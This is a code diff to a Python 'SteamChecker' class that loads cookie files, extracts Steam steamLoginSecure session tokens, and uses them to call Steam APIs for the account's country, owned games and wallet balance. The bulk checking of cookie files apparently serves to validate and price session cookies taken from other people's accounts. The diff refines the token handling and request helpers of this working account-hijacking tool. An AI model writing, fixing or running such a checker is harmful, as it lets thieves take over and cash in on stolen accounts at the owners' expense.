@@ -245,7 +245,7 @@ def load_cookies(filepath):
     return None
 
 # ------------------------------------------------------------
-# SteamChecker class with fallback validation
+# SteamChecker class with fallback validation & robust API calls
 # ------------------------------------------------------------
 class SteamChecker:
     def __init__(self, cookie_data, cookie_file_path, index):
@@ -281,7 +281,6 @@ class SteamChecker:
                         return steamid
         return None
 
-    # ========== FIX: DO NOT UNQUOTE THE TOKEN ==========
     def extract_token(self):
         for cookie in self.cookie_data:
             if cookie.get('name') == 'steamLoginSecure':
@@ -289,8 +288,8 @@ class SteamChecker:
                 if '%7C%7C' in value:
                     parts = value.split('%7C%7C')
                     if len(parts) >= 2:
-                        # Return the raw token (no urllib.parse.unquote)
-                        return parts[1]
+                        # Unquote like original SteamCookie.py
+                        return baro_enc.unquote(parts[1])
         return None
 
     def get_username_from_profile(self, sid_int):
@@ -397,18 +396,28 @@ class SteamChecker:
         except:
             pass
 
-        # If profile page loaded, we already have a valid cookie
+        # If profile page loaded, we already have a valid cookie.
+        # Now try to get additional info from APIs – using params to encode token properly.
         if profile_ok:
-            # Try to get additional info from APIs (optional)
             try:
+                # Helper to make API requests with token as query param
+                def api_get(url, params=None, **kwargs):
+                    params = params or {}
+                    params['access_token'] = self.token
+                    return self.session.get(url, params=params, timeout=10, **kwargs)
+
+                def api_post(url, data=None, **kwargs):
+                    # For POST, we need to add token to URL
+                    sep = '&' if '?' in url else '?'
+                    url_with_token = f"{url}{sep}access_token={baro_enc.quote(self.token)}"
+                    return self.session.post(url_with_token, data=data, timeout=10, **kwargs)
+
                 # Get country
                 cpb = struct.pack('<BQ', 0x09, sid_int)
-                resp = self.session.post(
-                    f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
-                    f"?access_token={self.token}",
+                resp = api_post(
+                    "https://api.steampowered.com/IUserAccountService/GetUserCountry/v1",
                     data=brn_mp("input_protobuf_encoded", base64.b64encode(cpb).decode()),
-                    headers={"Content-Type": BARON_CT},
-                    timeout=10
+                    headers={"Content-Type": BARON_CT}
                 )
                 if resp.status_code == 200:
                     data = baron_pd(resp.content)
@@ -423,11 +432,9 @@ class SteamChecker:
                        baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
                        baro_pi(9, 1) + baro_pi(10, 1))
                 gb64 = baro_enc.quote(base64.b64encode(gpb).decode())
-                resp = self.session.get(
-                    f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
-                    f"?access_token={self.token}"
-                    f"&input_protobuf_encoded={gb64}",
-                    timeout=10
+                resp = api_get(
+                    "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1",
+                    params={"input_protobuf_encoded": gb64}
                 )
                 if resp.status_code == 200:
                     data = baron_pd(resp.content)
@@ -451,12 +458,10 @@ class SteamChecker:
                             continue
 
                 # Get balance
-                resp = self.session.post(
-                    f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
-                    f"?access_token={self.token}",
+                resp = api_post(
+                    "https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1",
                     data=brn_mp("input_protobuf_encoded", "GAE="),
-                    headers={"Content-Type": BARON_CT},
-                    timeout=10
+                    headers={"Content-Type": BARON_CT}
                 )
                 if resp.status_code == 200:
                     data = baron_pd(resp.content)
@@ -488,7 +493,8 @@ class SteamChecker:
                             value = 0.0
                         return value, symbol
                     self.balance_float, self.currency = parse_balance(bal, self.country)
-            except:
+            except Exception as e:
+                # Log error but continue – we still have a valid profile
                 pass
 
             self.success = True
@@ -497,14 +503,23 @@ class SteamChecker:
         # ---- If profile failed, try the APIs as fallback ----
         any_api_success = False
         try:
+            # Helper functions (same as above)
+            def api_get(url, params=None, **kwargs):
+                params = params or {}
+                params['access_token'] = self.token
+                return self.session.get(url, params=params, timeout=10, **kwargs)
+
+            def api_post(url, data=None, **kwargs):
+                sep = '&' if '?' in url else '?'
+                url_with_token = f"{url}{sep}access_token={baro_enc.quote(self.token)}"
+                return self.session.post(url_with_token, data=data, timeout=10, **kwargs)
+
             # Country
             cpb = struct.pack('<BQ', 0x09, sid_int)
-            resp = self.session.post(
-                f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
-                f"?access_token={self.token}",
+            resp = api_post(
+                "https://api.steampowered.com/IUserAccountService/GetUserCountry/v1",
                 data=brn_mp("input_protobuf_encoded", base64.b64encode(cpb).decode()),
-                headers={"Content-Type": BARON_CT},
-                timeout=10
+                headers={"Content-Type": BARON_CT}
             )
             if resp.status_code == 200:
                 data = baron_pd(resp.content)
@@ -520,11 +535,9 @@ class SteamChecker:
                    baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
                    baro_pi(9, 1) + baro_pi(10, 1))
             gb64 = baro_enc.quote(base64.b64encode(gpb).decode())
-            resp = self.session.get(
-                f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
-                f"?access_token={self.token}"
-                f"&input_protobuf_encoded={gb64}",
-                timeout=10
+            resp = api_get(
+                "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1",
+                params={"input_protobuf_encoded": gb64}
             )
             if resp.status_code == 200:
                 data = baron_pd(resp.content)
@@ -549,12 +562,10 @@ class SteamChecker:
                         continue
 
             # Balance
-            resp = self.session.post(
-                f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
-                f"?access_token={self.token}",
+            resp = api_post(
+                "https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1",
                 data=brn_mp("input_protobuf_encoded", "GAE="),
-                headers={"Content-Type": BARON_CT},
-                timeout=10
+                headers={"Content-Type": BARON_CT}
             )
             if resp.status_code == 200:
                 data = baron_pd(resp.content)
